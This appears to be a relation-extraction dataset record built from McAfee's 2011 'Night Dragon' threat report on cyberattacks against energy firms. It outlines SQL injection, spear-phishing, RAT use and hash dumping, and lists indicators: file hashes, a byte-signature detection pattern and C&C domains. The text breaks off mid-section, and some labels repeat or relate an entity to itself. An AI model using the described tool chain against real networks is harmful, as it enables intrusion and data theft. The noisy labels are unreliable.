[{"vertexSet": [[{"name": "Google", "pos": [1, 2], "sent_id": 10, "type": "ExploitTargetObject"}], [{"name": "Operation Aurora", "pos": [5, 7], "sent_id": 10, "type": "Campaign"}], [{"name": "social engineering", "pos": [4, 6], "sent_id": 16, "type": "Exploit"}], [{"name": "spearphishing attacks", "pos": [7, 9], "sent_id": 16, "type": "Exploit"}], [{"name": "remote administration tools", "pos": [27, 30], "sent_id": 16, "type": "Malware"}], [{"name": "sensitive competitive proprietary operations", "pos": [37, 41], "sent_id": 16, "type": "BusinessInformation"}], [{"name": "project-financing information", "pos": [42, 46], "sent_id": 16, "type": "FinancialInformation"}], [{"name": "Night Dragon", "pos": [21, 23], "sent_id": 17, "type": "Attacker"}], [{"name": "SQL-injection", "pos": [19, 22], "sent_id": 27, "type": "Exploit"}], [{"name": "pass-the-hash", "pos": [64, 69], "sent_id": 27, "type": "Exploit"}], [{"name": "Microsoft Internet Explorer (IE) proxy settings", "pos": [118, 126], "sent_id": 27, "type": "Vulnerability"}], [{"name": "China", "pos": [170, 171], "sent_id": 27, "type": "Country"}], [{"name": "United States", "pos": [181, 183], "sent_id": 27, "type": "Country"}], [{"name": "Netherlands", "pos": [188, 189], "sent_id": 27, "type": "Country"}], [{"name": "Kazakhstan", "pos": [209, 210], "sent_id": 27, "type": "Country"}], [{"name": "Taiwan", "pos": [211, 212], "sent_id": 27, "type": "Country"}], [{"name": "Greece", "pos": [213, 214], "sent_id": 27, "type": "Country"}], [{"name": "corporate VPN accounts", "pos": [37, 40], "sent_id": 30, "type": "Account"}], [{"name": "User opens infected email", "pos": [36, 40], "sent_id": 35, "type": "EmailAction"}], [{"name": "C&C server", "pos": [88, 90], "sent_id": 35, "type": "Exploit"}], [{"name": "reduh", "pos": [13, 14], "sent_id": 37, "type": "Malware"}], [{"name": "WebShell", "pos": [15, 16], "sent_id": 37, "type": "Malware"}], [{"name": "ASPXSpy", "pos": [17, 18], "sent_id": 37, "type": "Malware"}], [{"name": "zero-day", "pos": [26, 29], "sent_id": 37, "type": "Malware"}], [{"name": "Rootkin.net.cn", "pos": [0, 1], "sent_id": 39, "type": "Indicator"}], [{"name": "local administrator accounts", "pos": [44, 47], "sent_id": 41, "type": "Account"}], [{"name": "Active Directory administrator", "pos": [48, 51], "sent_id": 41, "type": "Account"}], [{"name": "Windows", "pos": [0, 1], "sent_id": 43, "type": "Software"}], [{"name": "SysInternals tools", "pos": [5, 7], "sent_id": 43, "type": "Exploit"}], [{"name": "Microsoft", "pos": [10, 11], "sent_id": 43, "type": "Organization"}], [{"name": "Gh0st", "pos": [9, 10], "sent_id": 47, "type": "Malware"}], [{"name": "screen and webcam spying", "pos": [4, 8], "sent_id": 48, "type": "Exploit"}], [{"name": "keystroke logging", "pos": [9, 11], "sent_id": 48, "type": "Exploit"}], [{"name": "mouse control", "pos": [12, 14], "sent_id": 48, "type": "Exploit"}], [{"name": "process management", "pos": [20, 22], "sent_id": 48, "type": "Exploit"}], [{"name": "zwShell", "pos": [7, 8], "sent_id": 50, "type": "Malware"}], [{"name": "spring of 2010", "pos": [18, 21], "sent_id": 50, "type": "Time"}], [{"name": "gsecdump", "pos": [17, 18], "sent_id": 54, "type": "Exploit"}], [{"name": "Cain & Abel", "pos": [21, 24], "sent_id": 54, "type": "Exploit"}], [{"name": "SCADA", "pos": [9, 10], "sent_id": 57, "type": "System"}], [{"name": "Host files", "pos": [15, 17], "sent_id": 63, "type": "File"}], [{"name": "registry keys", "pos": [18, 20], "sent_id": 63, "type": "File"}], [{"name": "zwShell.exe", "pos": [50, 51], "sent_id": 63, "type": "File"}], [{"name": "Trojan dropper", "pos": [0, 2], "sent_id": 64, "type": "Dropper"}], [{"name": "gzg", "pos": [11, 12], "sent_id": 73, "type": "Indicator"}], [{"name": "19 KB to 23 KB", "pos": [9, 14], "sent_id": 81, "type": "Information"}], [{"name": "startup.dll", "pos": [4, 5], "sent_id": 86, "type": "File"}], [{"name": "connect.dll", "pos": [0, 1], "sent_id": 87, "type": "File"}], [{"name": "PluginFile.dll", "pos": [28, 29], "sent_id": 87, "type": "File"}], [{"name": "PluginScreen.dll", "pos": [1, 2], "sent_id": 88, "type": "File"}], [{"name": "PluginCmd.dll", "pos": [0, 1], "sent_id": 89, "type": "File"}], [{"name": "PluginKeyboard.dll", "pos": [2, 3], "sent_id": 89, "type": "File"}], [{"name": "PluginProcess.dll", "pos": [4, 5], "sent_id": 89, "type": "File"}], [{"name": "PluginService.dll", "pos": [6, 7], "sent_id": 89, "type": "File"}], [{"name": "PluginRegedit.dll", "pos": [8, 9], "sent_id": 89, "type": "File"}], [{"name": "RAT", "pos": [4, 5], "sent_id": 107, "type": "Malware"}], [{"name": "C&C application server", "pos": [5, 8], "sent_id": 108, "type": "MalwareCharacteristics"}], [{"name": "generator utility for creating droppers", "pos": [10, 15], "sent_id": 108, "type": "MalwareCharacteristics"}], [{"name": "related droppers", "pos": [16, 18], "sent_id": 108, "type": "MalwareCharacteristics"}], [{"name": "backdoors", "pos": [20, 21], "sent_id": 108, "type": "MalwareCharacteristics"}], [{"name": "McAfee", "pos": [0, 1], "sent_id": 110, "type": "Organization"}], [{"name": "McAfee ePolicy Orchestrator", "pos": [5, 8], "sent_id": 110, "type": "Software"}], [{"name": "hW$", "pos": [20, 21], "sent_id": 114, "type": "Indicator"}], [{"name": "\\x01\\x50[\\x00-\\xff]+\\x68\\x57\\x24\\x13", "pos": [24, 25], "sent_id": 115, "type": "Indicator"}], [{"name": "dynamic DNS", "pos": [4, 6], "sent_id": 121, "type": "Exploit"}], [{"name": "[xxxx].is-a-chef.com", "pos": [23, 29], "sent_id": 122, "type": "Indicator"}], [{"name": "[xxxx].thruhere.net", "pos": [30, 32], "sent_id": 122, "type": "Indicator"}], [{"name": "[xxxx].office-on-the.net", "pos": [33, 39], "sent_id": 122, "type": "Indicator"}], [{"name": "[xxxx].selfip.com", "pos": [40, 42], "sent_id": 122, "type": "Indicator"}], [{"name": "intrusion detection system", "pos": [5, 8], "sent_id": 126, "type": "CourseOfAction"}], [{"name": "McAfee Vulnerability Manager", "pos": [20, 23], "sent_id": 138, "type": "Software"}], [{"name": "wham-apt-nightdragon-detected-v7.fasl3", "pos": [2, 11], "sent_id": 139, "type": "SourceCodeInformation"}], [{"name": "McAfee Policy Auditor", "pos": [12, 15], "sent_id": 140, "type": "Software"}], [{"name": "McAfee Risk Advisory", "pos": [49, 52], "sent_id": 140, "type": "Software"}], [{"name": "McAfee", "pos": [99, 100], "sent_id": 140, "type": "Organization"}], [{"name": "McAfee VirusScan Enterprise", "pos": [1, 4], "sent_id": 141, "type": "Software"}], [{"name": "McAfee Network Threat Response", "pos": [1, 5], "sent_id": 144, "type": "Software"}], [{"name": "McAfee \u201cNight Dragon Vulnerability Scanner\u201d", "pos": [49, 56], "sent_id": 144, "type": "Software"}], [{"name": "McAfee Labs Stinger", "pos": [72, 75], "sent_id": 144, "type": "Software"}], [{"name": "McAfee Application Control", "pos": [1, 4], "sent_id": 147, "type": "Software"}], [{"name": "McAfee Configuration Control", "pos": [50, 53], "sent_id": 147, "type": "Software"}], [{"name": "McAfee Database Activity Monitoring", "pos": [84, 88], "sent_id": 147, "type": "Software"}], [{"name": "McAfee Network Security Platform", "pos": [1, 5], "sent_id": 148, "type": "Software"}], [{"name": "McAfee Enterprise Firewall", "pos": [1, 4], "sent_id": 149, "type": "Software"}], [{"name": "McAfee Web Gateway", "pos": [44, 47], "sent_id": 149, "type": "Software"}], [{"name": "McAfee Endpoint Encryption", "pos": [84, 87], "sent_id": 149, "type": "Software"}], [{"name": "McAfee Data Loss Protection", "pos": [125, 129], "sent_id": 149, "type": "Software"}], [{"name": "McAfee Host Intrusion Prevention 8.0", "pos": [159, 164], "sent_id": 149, "type": "Software"}], [{"name": "McAfee VirusScan\u00ae Enterprise", "pos": [205, 209], "sent_id": 149, "type": "Software"}], [{"name": "zwShell", "pos": [0, 1], "sent_id": 167, "type": "Malware"}], [{"name": "Write of address 00000000", "pos": [24, 28], "sent_id": 169, "type": "Indicator"}], [{"name": "zw.china.", "pos": [26, 28], "sent_id": 171, "type": "Password"}], [{"name": "zwShell", "pos": [7, 8], "sent_id": 175, "type": "Malware"}], [{"name": "Heze City", "pos": [35, 37], "sent_id": 211, "type": "Location"}], [{"name": "9:00 a.m. to 5:00 p.m", "pos": [35, 40], "sent_id": 218, "type": "Time"}], [{"name": "Hookmsgina", "pos": [2, 3], "sent_id": 220, "type": "Exploit"}], [{"name": "WinlogonHack", "pos": [4, 5], "sent_id": 220, "type": "Exploit"}]], "labels": [{"r": "P23", "h": 7, "t": 4, "evidence": [16, 17]}, {"r": "P27", "h": 1, "t": 0, "evidence": [10]}, {"r": "P17", "h": 29, "t": 27, "evidence": [43]}, {"r": "P13", "h": 55, "t": 56, "evidence": [107, 108]}, {"r": "P13", "h": 55, "t": 57, "evidence": [107, 108]}, {"r": "P13", "h": 55, "t": 58, "evidence": [107, 108]}, {"r": "P13", "h": 55, "t": 59, "evidence": [107, 108]}, {"r": "P17", "h": 60, "t": 61, "evidence": [110]}, {"r": "P21", "h": 62, "t": 55, "evidence": [107, 114]}, {"r": "P21", "h": 63, "t": 55, "evidence": [107, 115]}, {"r": "P21", "h": 90, "t": 89, "evidence": [167, 169]}, {"r": "P2", "h": 7, "t": 4, "evidence": [16, 17]}, {"r": "P2", "h": 7, "t": 0, "evidence": [10, 17]}, {"r": "P2", "h": 7, "t": 0, "evidence": [10, 17]}, {"r": "P2", "h": 7, "t": 0, "evidence": [10, 17]}, {"r": "P2", "h": 7, "t": 2, "evidence": [16, 17]}, {"r": "P2", "h": 7, "t": 7, "evidence": [17]}, {"r": "P2", "h": 7, "t": 8, "evidence": [17, 27]}, {"r": "P2", "h": 7, "t": 8, "evidence": [17, 27]}, {"r": "P7", "h": 4, "t": 1, "evidence": [10, 16]}, {"r": "P7", "h": 8, "t": 1, "evidence": [10, 27]}, {"r": "P32", "h": 7, "t": 8, "evidence": [17, 27]}, {"r": "P33", "h": 7, "t": 2, "evidence": [16, 17]}, {"r": "P33", "h": 7, "t": 8, "evidence": [17, 27]}, {"r": "P12", "h": 4, "t": 7, "evidence": [16, 17]}, {"r": "P12", "h": 7, "t": 7, "evidence": [17]}, {"r": "P13", "h": 4, "t": 4, "evidence": [16]}, {"r": "P13", "h": 4, "t": 7, "evidence": [16, 17]}, {"r": "P13", "h": 4, "t": 7, "evidence": [16, 17]}, {"r": "P13", "h": 2, "t": 4, "evidence": [16]}, {"r": "P13", "h": 2, "t": 7, "evidence": [16, 17]}, {"r": "P13", "h": 2, "t": 7, "evidence": [16, 17]}, {"r": "P13", "h": 7, "t": 4, "evidence": [16, 17]}, {"r": "P13", "h": 7, "t": 7, "evidence": [17]}, {"r": "P13", "h": 7, "t": 7, "evidence": [17]}, {"r": "P17", "h": 2, "t": 2, "evidence": [16]}, {"r": "P17", "h": 7, "t": 7, "evidence": [17]}, {"r": "P17", "h": 7, "t": 6, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 6, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 6, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 6, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 6, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 5, "evidence": [16, 17]}, {"r": "P17", "h": 7, "t": 8, "evidence": [17, 27]}, {"r": "P17", "h": 7, "t": 8, "evidence": [17, 27]}, {"r": "P19", "h": 2, "t": 1, "evidence": [10, 16]}, {"r": "P21", "h": 0, "t": 4, "evidence": [10, 16]}], "title": "201102McAfeeNightDragon", "sents": [["White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d"], ["By", "McAfee", "\u00ae", "Foundstone", "\u00ae", "Professional", "Services", "and", "McAfee", "Labs", "\u2122"], ["February", "10", ",", "2011", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Table", "of", "Contents", "Executive", "Summary", "3", "Anatomy", "of", "a", "Hack", "3", "Details", "of", "the", "Attack", "4", "Use", "of", "remote", "administration", "tools", "7", "Detection", "7", "Host", "Files", "and", "Registry", "Keys", "8", "Anti", "-", "virus", "Alerts", "9", "Network", "Communications", "9", "Additional", "Detection", "Techniques", "11", "McAfee", "Early", "Detection", "11", "McAfee", "Detection", "12", "McAfee", "Prevention", "12", "Conclusion", "13", "Credits", "and", "Acknowledgements", "13", "Appendix", "A", ":"], ["zwShell", "\u2014", "the", "RAT", "13", "Appendix", "B", ":", "Attribution", "18", "Version", "1.4", "|", "Feb", "11", ",", "2011", "03:30", "PM", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Executive", "Summary"], ["In", "2010", ",", "we", "entered", "a", "new", "decade", "in", "the", "world", "of", "cybersecurity", "."], ["The", "prior", "decade", "was", "stained", "with", "immaturity", ",", "reactive", "technical", "solutions", ",", "and", "a", "lack", "of", "security", "sophistication", "that", "promoted", "critical", "outbreaks", ",", "such", "as", "Code", "Red", ",", "Nimda", ",", "Blaster", ",", "Sasser", ",", "SQL", "Slammer", ",", "Conficker", ",", "and", "myDoom", "\u2014", "to", "name", "a", "few", "."], ["The", "security", "community", "has", "evolved", "and", "grown", "smarter", "about", "security", ",", "safe", "computing", ",", "and", "system", "hardening"], ["but", "so", "have", "our", "adversaries", "."], ["This", "decade", "is", "setting", "up", "to", "be", "the", "exponential", "jumping", "off", "point", "."], ["The", "adversaries", "are", "rapidly", "leveraging", "productized", "malware", "toolkits", "that", "let", "them", "develop", "more", "malware", "than", "in", "all", "prior", "years", "combined", ",", "and", "they", "have", "matured", "from", "the", "prior", "decade", "to", "release", "the", "most", "insidious", "and", "persistent", "cyberthreats", "ever", "known", "."], ["The", "Google", "hacks", "(", "\u201c", "Operation", "Aurora", "\u201d", ")", ",", "named", "by", "McAfee", "and", "announced", "in", "January", "2010", ",", "and", "the", "WikiLeaks", "document", "disclosures", "of", "2010", "have", "highlighted", "the", "fact", "that", "external", "and", "internal", "threats", "are", "nearly", "impossible", "to", "prevent", "."], ["Miscreants", "continue", "to", "infiltrate", "networks", "and", "exfiltrate", "sensitive", "and", "proprietary", "data", "upon", "which", "the", "world", "\u2019s", "economies", "depend", "every", "day", "."], ["When", "a", "new", "attack", "emerges", ",", "security", "vendors", "can", "not", "stand", "by", "idly", "and", "watch", "."], ["We", "are", "obligated", "to", "share", "our", "findings", "to", "protect", "those", "not", "yet", "impacted", "and", "to", "repair", "those", "who", "have", "been", "."], ["As", "such", ",", "McAfee", "Foundstone", "Professional", "Services", "and", "McAfee", "Labs", "decided", "to", "release", "the", "following", "discovery", "."], ["Starting", "in", "November", "2009", ",", "coordinated", "covert", "and", "targeted", "cyberattacks", "have", "been", "conducted", "against", "global", "oil", ",", "energy", ",", "and", "petrochemical", "companies", "."], ["These", "attacks", "have", "involved", "social", "engineering", ",", "spearphishing", "attacks", ",", "exploitation", "of", "Microsoft", "Windows", "operating", "systems", "vulnerabilities", ",", "Microsoft", "Active", "Directory", "compromises", ",", "and", "the", "use", "of", "remote", "administration", "tools", "(", "RATs", ")", "in", "targeting", "and", "harvesting", "sensitive", "competitive", "proprietary", "operations", "and", "project", "-", "financing", "information", "with", "regard", "to", "oil", "and", "gas", "field", "bids", "and", "operations", "."], ["We", "have", "identified", "the", "tools", ",", "techniques", ",", "and", "network", "activities", "used", "in", "these", "continuing", "attacks", "\u2014", "which", "we", "have", "dubbed", "Night", "Dragon", "\u2014", "as", "originating", "primarily", "in", "China", "."], ["Through", "coordinated", "analysis", "of", "the", "related", "events", "and", "tools", "used", ",", "McAfee", "has", "determined", "identifying", "features", "to", "assist", "companies", "with", "detection", "and", "investigation", "."], ["While", "we", "believe", "many", "actors", "have", "participated", "in", "these", "attacks", ",", "we", "have", "been", "able", "to", "identify", "one", "individual", "who", "has", "provided", "the", "crucial", "C&C", "infrastructure", "to", "the", "attackers", "."], ["(", "See", "Appendix", "B", "for", "more", "detail", "on", "attribution", ".", ")"], ["Anatomy", "of", "a", "Hack", "1", "2", "3", "4", "5", "Extranet", "web", "servers", "compromised", "Gained", "access", "to", "sensitive", "internal", "desktops", "and", "servers", "Accessed", "additional", "usernames", "and", "passwords", "Enabled", "direct", "communication", "from", "infected", "machines", "to", "the", "Internet", "Exfiltrated", "email", "archives", "and", "other", "sensitive", "documents", "Remote", "command", "execution", "Hacker", "tools", "uploaded", "to", "servers", "Further", "access", "to", "sensitive", "documents", "NIGHT", "DRAGON", "Global", "Energy"], ["Cyberattacks", "Disabled", "IE", "proxy", "settings", "Executives", "\u2019", "computers", "compromised", "Source", ":", "McAfee", ",", "Inc."], ["Figure", "1", "."], ["Anatomy", "of", "a", "hack", "."], ["3", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d"], ["The", "Night", "Dragon", "attacks", "work", "by", "methodical", "and", "progressive", "intrusions", "into", "the", "targeted", "infrastructure", "."], ["The", "following", "basic", "activities", "were", "performed", "by", "the", "Night", "Dragon", "operation", ":", "\u2022", "Company", "extranet", "web", "servers", "compromised", "through", "SQL", "-", "injection", "techniques", ",", "allowing", "remote", "command", "execution", "\u2022", "Commonly", "available", "hacker", "tools", "are", "uploaded", "on", "compromised", "web", "servers", ",", "allowing", "attackers", "to", "pivot", "into", "the", "company", "\u2019s", "intranet", "and", "giving", "them", "access", "to", "sensitive", "desktops", "and", "servers", "internally", "\u2022", "Using", "password", "cracking", "and", "pass", "-", "the", "-", "hash", "tools", ",", "attackers", "gain", "additional", "usernames", "and", "passwords", ",", "allowing", "them", "to", "obtain", "further", "authenticated", "access", "to", "sensitive", "internal", "desktops", "and", "servers", "\u2022", "Initially", "using", "the", "company", "\u2019s", "compromised", "web", "servers", "as", "command", "and", "control", "(", "C&C", ")", "servers", ",", "the", "attackers", "discovered", "that", "they", "needed", "only", "to", "disable", "Microsoft", "Internet", "Explorer", "(", "IE", ")", "proxy", "settings", "to", "allow", "direct", "communication", "from", "infected", "machines", "to", "the", "Internet", "\u2022", "Using", "the", "RAT", "malware", ",", "they", "proceeded", "to", "connect", "to", "other", "machines", "(", "targeting", "executives", ")", "and", "exfiltrating", "email", "archives", "and", "other", "sensitive", "documents", "Details", "of", "the", "Attack", "Attackers", "using", "several", "locations", "in", "China", "have", "leveraged", "C&C", "servers", "on", "purchased", "hosted", "services", "in", "the", "United", "States", "and", "compromised", "servers", "in", "the", "Netherlands", "to", "wage", "attacks", "against", "global", "oil", ",", "gas", ",", "and", "petrochemical", "companies", ",", "as", "well", "as", "individuals", "and", "executives", "in", "Kazakhstan", ",", "Taiwan", ",", "Greece", ",", "and", "the", "United", "States", "to", "acquire", "proprietary", "and", "highly", "confidential", "information", "."], ["The", "primary", "operational", "technique", "used", "by", "the", "attackers", "comprised", "a", "variety", "of", "hacker", "tools", ",", "including", "privately", "developed", "and", "customized", "RAT", "tools", "that", "provided", "complete", "remote", "administration", "capabilities", "to", "the", "attacker", "."], ["RATs", "provide", "functions", "similar", "to", "Citrix", "or", "Microsoft", "Windows", "Terminal", "Services", ",", "allowing", "a", "remote", "individual", "to", "completely", "control", "the", "affected", "system", "."], ["To", "deploy", "these", "tools", ",", "attackers", "first", "compromised", "perimeter", "security", "controls", ",", "through", "SQL", "-", "injection", "exploits", "of", "extranet", "web", "servers", ",", "as", "well", "as", "targeted", "spear", "-", "phishing", "attacks", "of", "mobile", "worker", "laptops", ",", "and", "compromising", "corporate", "VPN", "accounts", "to", "penetrate", "the", "targeted", "company", "\u2019s", "defensive", "architectures", "(", "DMZs", "and", "firewalls", ")", "and", "conduct", "reconnaissance", "of", "targeted", "companies", "\u2019", "networked", "computers", "."], ["SQL", "Injection", "Attacks", "(", "1", ")", "Attacker", "crafts", "a", "HTTP", "GET", "request", "to", "inject", "commands", "to", "SQL", "server", "to", "gain", "system", "-", "level", "access", "(", "2", ")", "Malware", "is", "placed", "on", "server", "and", "used", "to", "harvest", "the", "local", "and", "Active", "Directory", "account", "credentials", "Web", "SQL", "Internet", "AD", "(", "4", ")", "Attacker", "uses", "RAT", "malware", "to", "conduct", "additional", "reconnaissance", "and", "systems", "compromises", "and", "to", "harvest", "confidential", "data", "C&C", "(", "3", ")"], ["Active", "Directory", "accounts", "are", "used", "to", "access", "network", "computers", "and", "plant", "RAT", "malware", "that", "connects", "with", "remote", "C&C", "addresses", "."], ["Figure", "2", "."], ["SQL", "-", "injection", "attacks", "."], ["4", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Spear", "-", "Phishing", "Attacks", "(", "1", ")", "Attacker", "sends", "a", "spear", "-", "phishing", "email", "containing", "a", "link", "to", "a", "compromised", "web", "server", "(", "2", ")", "User", "opens", "infected", "email", "and", "the", "compromised", "website", "is", "accessed", ";", "a", "RAT", "is", "downloaded", "Web", "Email", "Internet", "(", "4", ")", "Attacker", "uses", "RAT", "malware", "to", "conduct", "additional", "reconnaissance", "and", "systems", "compromises", "and", "to", "harvest", "confidential", "data", "C&C", "(", "3", ")", "User", "account", "information", "and", "host", "configuration", "information", "is", "sent", "to", "a", "C&C", "server", "Figure", "3", "."], ["Spear", "-", "phishing", "attacks", "."], ["Many", "Chinese", "hacker", "websites", "offer", "these", "tools", "for", "download", ",", "including", "links", "to", "reduh", ",", "WebShell", ",", "ASPXSpy", ",", "and", "many", "others", ",", "plus", "exploits", "and", "zero", "-", "day", "malware", "."], ["Figure", "4", "."], ["Rootkin.net.cn", "offers", "access", "to", "an", "endless", "list", "of", "hacker", "tools", "and", "exploits", "."], ["5", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Figure", "5", "."], ["WebShell", "and", "ASPXSpy", "tools", "allow", "an", "attacker", "to", "bypass", "many", "firewall", "rules", "to", "funnel", "all", "control", "through", "a", "company", "\u2019s", "web", "server", ".", "6", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Once", "the", "initial", "system", "was", "compromised", ",", "the", "attackers", "compromised", "local", "administrator", "accounts", "and", "Active", "Directory", "administrator", "(", "and", "administrative", "users", ")", "accounts", "."], ["The", "attackers", "often", "used", "common"], ["Windows", "utilities", ",", "such", "as", "SysInternals", "tools", "(", "acquired", "by", "Microsoft", "in", "2006", ")", "\u2014", "and", "other", "publicly", "available", "software", ",", "including", "hacking", "tools", "developed", "in", "China", "and", "widely", "available", "on", "Chinese", "underground", "hacker", "websites", "\u2014", "to", "establish", "\u201c", "backdoors", "\u201d", "through", "reverse", "proxies", "and", "planted", "Trojans", "that", "allowed", "the", "attackers", "to", "bypass", "network", "and", "host", "security", "policies", "and", "settings", "."], ["Desktop", "anti", "-", "virus", "and", "anti", "-", "spyware", "tools", "were", "also", "disabled", "in", "some", "instances", "\u2014", "a", "common", "technique", "of", "targeted", "attacks", "."], ["Use", "of", "remote", "administration", "tools"], ["Remote", "administration", "tools", "(", "RATs", ")", "are", "commonly", "used", "administrative", "tools", "that", "allow", "hackers", "(", "and", "administrators", ")", "to", "manage", "victims", "\u2019", "computers", "(", "or", "managed", "systems", ")", "and", "completely", "control", "their", "use", "and", "function", "."], ["A", "commonly", "used", "RAT", "in", "the", "hacker", "community", "is", "Gh0st", "and", "its", "many", "variants", "."], ["RAT", "features", "often", "include", "screen", "and", "webcam", "spying", ",", "keystroke", "logging", ",", "mouse", "control", ",", "file", "/", "registry", ",", "and", "process", "management", ",", "and", ",", "of", "course", ",", "remote", "command", "shell", "capability", "."], ["McAfee", "has", "identified", "several", "RATs", "that", "have", "been", "used", "to", "establish", "a", "persistent", "infiltration", "channel", "into", "compromised", "companies", "."], ["One", "of", "the", "most", "prevalent", "RATs", "is", "zwShell", ",", "which", "McAfee", "has", "seen", "in", "the", "wild", "since", "the", "spring", "of", "2010", "(", "compiled", "on", "2010", "-", "03", "-", "17", "08:47:00", ")", "."], ["Written", "in", "the", "Delphi", "language", ",", "zwShell", "was", "used", "by", "attackers", "to", "both", "build", "custom", "variants", "of", "the", "Trojan", "that", "they", "deployed", "on", "dozens", "of", "machines", "within", "each", "victim", "company", ",", "as", "well", "as", "to", "control", "compromised", "machines", "that", "would", "initiate", "beacon", "connections", "to", "it", "on", "a", "custom", "protocol", "."], ["Attackers", "used", "zwShell", "extensively", "to", "generate", "dozens", "of", "unique", "Trojan", "variants", "and", "to", "control", "the", "infected", "machines", "and", "exfiltrate", "sensitive", "data", "directly", "from", "them", "."], ["(", "See", "Appendix", "A", "for", "a", "breakdown", "of", "the", "zwShell", ".", ")"], ["Once", "the", "attackers", "had", "complete", "control", "of", "the", "targeted", "internal", "system", ",", "they", "dumped", "account", "hashes", "with", "gsecdump", "and", "used", "the", "Cain", "&", "Abel", "tool", "to", "crack", "the", "hashes", "to", "leverage", "them", "in", "targeting", "ever", "more", "sensitive", "infrastructures", "."], ["Files", "of", "interest", "focused", "on", "operational", "oil", "and", "gas", "field", "production", "systems", "and", "financial", "documents", "related", "to", "field", "exploration", "and", "bidding", "that", "were", "later", "copied", "from", "the", "compromised", "hosts", "or", "via", "extranet", "servers", "."], ["In", "some", "cases", ",", "the", "files", "were", "copied", "to", "and", "downloaded", "from", "company", "web", "servers", "by", "the", "attackers", "."], ["In", "certain", "cases", ",", "the", "attackers", "collected", "data", "from", "SCADA", "systems", "."], ["Detection"], ["The", "methods", "and", "tools", "used", "in", "these", "attacks", "are", "relatively", "unsophisticated", ",", "as", "they", "simply", "appear", "to", "be", "standard", "host", "administration", "techniques", ",", "using", "standard", "administrative", "credentials", "."], ["This", "is", "largely", "why", "they", "are", "able", "to", "evade", "detection", "by", "standard", "security", "software", "and", "network", "policies", "."], ["Since", "the", "initial", "compromises", ",", "however", ",", "many", "individual", "unique", "signatures", "have", "been", "identified", "for", "the", "Trojan", "and", "associated", "tools", "by", "security", "vendors", ",", "including", "McAfee", ";", "yet", "only", "through", "recent", "analysis", "and", "the", "discovery", "of", "common", "artifacts", "and", "evidence", "correlation", "have", "we", "been", "able", "to", "determine", "that", "a", "dedicated", "effort", "has", "been", "ongoing", "for", "at", "least", "two", "years", ",", "and", "likely", "as", "many", "as", "four", "."], ["We", "can", "now", "associate", "the", "various", "signatures", "to", "these", "events", "."], ["The", "following", "artifacts", "can", "help", "to", "determine", "whether", "a", "company", "has", "been", "compromised", ":", "\u2022", "Host", "files", "and/or", "registry", "keys", "\u2022", "Anti", "-", "virus", "alerts", "\u2022", "Network", "communications", "7", "White", "Paper", "Global", "Energy", "Cyberattacks", ":", "\u201c", "Night", "Dragon", "\u201d", "Host", "Files", "and", "Registry", "Keys", "Utility", "Description", "Command", "&", "control", "application", "zwShell.exe", "093640a69c8eafbc60343bf9cd1d3ad3", "zwShell.exe", "85df6b3e2c1a4c6ce20fc8080e0b53e9"], ["Trojan", "dropper"], ["A", "packaged", "executable", "customized", "to", "each", "victim", "that", "includes", "the", "DLL", "file", "and", "configuration", "settings", "for", "installing", "the", "backdoor", "on", "the", "remote", "system", "."], ["The", "dropper", "can", "be", "run", "from", "any", "directory", "and", "is", "usually", "executed", "with", "PSEXEC", "or", "an", "RDP", "session", "."], ["Thus", ",", "related", "Windows", "Security", "Event", "logs", "provide", "useful", "information", "concerning", "compromised", "Active", "Directory", "accounts", "."], ["These", "logs", "can", "be", "reviewed", "with", "Windows", "Event", "Log", "Manager", "or", "programs", ",", "such", "as", "\u201c", "Event", "Log", "Explorer", "\u201d", "or", "EnCase", ",", "which", "support", "search", "capabilities", "."], ["When", "executed", ",", "the", "dropper", "creates", "a", "temporary", "file", "that", "is", "reflected", "in", "Windows", "update", "logs", "(", "KB*.log", "files", "in", "c:\\Windows", "folder", ")", "."], ["This", "is", "because", "the", "Windows", "Registry", "is", "modified", "by", "the", "dropper", "to", "create", "a", "\u201c", "netsvcs", "\u201d", "key", "."], ["Accordingly", ",", "the", "date", "of", "the", "backdoor", "installation", "can", "be", "determined", "from", "a", "search", "of", "the", "KB", "log", "files", "."], ["This", "temporary", "file", "is", "also", "identified", "in", "the", "backdoor", "DLL", "itself", "."], ["The", "temporary", "file", "is", "usually", "some", "alphanumeric", "combination", "that", "includes", "\u201c", "gzg", "\u201d", "(", "for", "example", ",", "xgt0gzg", ")", ";", "however", ",", "it", "has", "been", "seen", "with", "generic", "file", "names", "(", "for", "example", ",", "server.exe", ")", "as", "well", "."], ["The", "dropper", "is", "deleted", "when", "the", "backdoor", "is", "installed", ",", "and", "the", "temporary", "file", "is", "removed", "when", "the", "computer", "is", "restarted", "."], ["If", "a", "backdoor", "has", "already", "been", "configured", "on", "the", "system", ",", "the", "dropper", "installation", "will", "fail", "unless", "it", "uses", "a", "different", "configuration", "."], ["Trojan", "backdoor", "Dynamic", "link", "libraries", "(", "DLLs", ")", ",", "also", "appearing", "under", "many", "other", "names", "."], ["These", "files", "have", "a", "correlated", "Windows", "Registry", "key", "that", "is", "determined", "by", "the", "dropper", "when", "the", "backdoor", "is", "installed", "."], ["The", "dropper", "iterates", "through", "the", "Windows", "netsvcs", "registry", "keys", 